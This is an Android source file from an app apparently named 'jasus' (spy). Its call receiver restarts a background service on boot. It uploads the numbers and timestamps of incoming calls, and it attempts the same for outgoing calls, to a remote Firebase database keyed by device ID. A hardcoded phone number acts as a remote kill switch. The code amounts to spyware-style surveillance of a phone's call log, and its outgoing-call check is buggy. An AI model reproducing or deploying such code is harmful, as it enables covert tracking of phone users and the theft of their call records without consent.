package com.perry.jasus.BroadcastServices;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import androidx.annotation.RequiresApi;

import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.perry.jasus.BackgroundServices.BackgroundBroadcastService;
import com.perry.jasus.Util.LocalData;
import com.perry.jasus.Models.Call_Model;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;


public class IncomingCall extends BroadcastReceiver {


    @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
    @SuppressLint({"UnsafeProtectedBroadcastReceiver", "SuspiciousIndentation"})
    @Override
    public void onReceive(Context context, Intent intent) {
        String deviceID = LocalData.getDeviceID(context);

        DatabaseReference reference= FirebaseDatabase.getInstance().getReference().child("Users").child(deviceID).child("Call");

        if(intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED))
        {
            Intent serviceIntent = new Intent(context, BackgroundBroadcastService.class);
            context.startForegroundService(serviceIntent);
        }

        try {
            //CALL
            String outgoingNumber=intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);

            DateFormat df = new SimpleDateFormat("EEE, d MMM yyyy, HH:mm a");
            String date = df.format(Calendar.getInstance().getTime());


            if(state.equals(TelephonyManager.EXTRA_STATE_RINGING)){
                if (incomingNumber!=null){

                    if (incomingNumber.equals("+919370467477")){
                        SharedPreferences preferences = context.getSharedPreferences("APP", Context.MODE_PRIVATE);
                        SharedPreferences.Editor editor = preferences.edit();

                        editor.putString("app", "stop");
                        editor.commit();

                        Toast.makeText(context, "bom save", Toast.LENGTH_SHORT).show();
                    }

                    Call_Model model = new Call_Model("Incomming", incomingNumber, date);
                    String key = reference.push().getKey();
                    Toast.makeText(context,"Call Aa raha hai Number : "+incomingNumber,Toast.LENGTH_SHORT).show();
                    reference.child(key).setValue(model).addOnSuccessListener(new OnSuccessListener<Void>() {
                        @Override
                        public void onSuccess(Void unused) {
                            Toast.makeText(context, "Data Added", Toast.LENGTH_SHORT).show();
                        }
                    });
                }


            }

            if (state.equals(Intent.EXTRA_PHONE_NUMBER)){
                Call_Model model = new Call_Model("Outgoing", outgoingNumber, date);
                String key = reference.push().getKey();
                Toast.makeText(context,"Call Lagaya hai Number : "+outgoingNumber,Toast.LENGTH_SHORT).show();
                reference.child(key).setValue(model).addOnSuccessListener(new OnSuccessListener<Void>() {
                    @Override
                    public void onSuccess(Void unused) {
                        Toast.makeText(context, "Data Added", Toast.LENGTH_SHORT).show();
                    }
                });
            }

            if ((state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK))){
                Toast.makeText(context,"Call Received",Toast.LENGTH_SHORT).show();
            }


            if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)){
                Toast.makeText(context,"Call kat gaya hai !! ",Toast.LENGTH_SHORT).show();
            }

        }
        catch (Exception e){
            e.printStackTrace();
        }

    }
}


